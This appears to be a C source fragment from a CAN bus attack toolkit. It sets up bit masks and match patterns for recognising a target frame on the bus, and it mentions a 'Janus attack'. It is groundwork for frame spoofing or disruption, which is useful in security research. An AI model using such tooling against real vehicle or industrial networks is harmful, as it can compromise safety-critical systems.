// Sets the CAN hack masks from frame 1 (frame 2 is only used in the Janus attack)
void canhack_set_attack_masks(void)
{
    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 2U;
    canhack.attack_parameters.bitstream_mask = (1ULL << (canhack.attack_parameters.n_frame_match_bits + 10U)) - 1ULL;
    canhack.attack_parameters.bitstream_match = 0x3ffULL;
    for (uint32_t i = 0; i < canhack.attack_parameters.n_frame_match_bits; i++) {
        canhack.attack_parameters.bitstream_match <<= 1U; // Shift a 0 in
        canhack.attack_parameters.bitstream_match |= canhack.can_frame1.tx_bitstream[i]; // OR in the bit (first bit is SOF)
    }
}

void canhack_init(void)
{
    canhack.can_frame1.frame_set = false;
    canhack.can_frame2.frame_set = false;
}
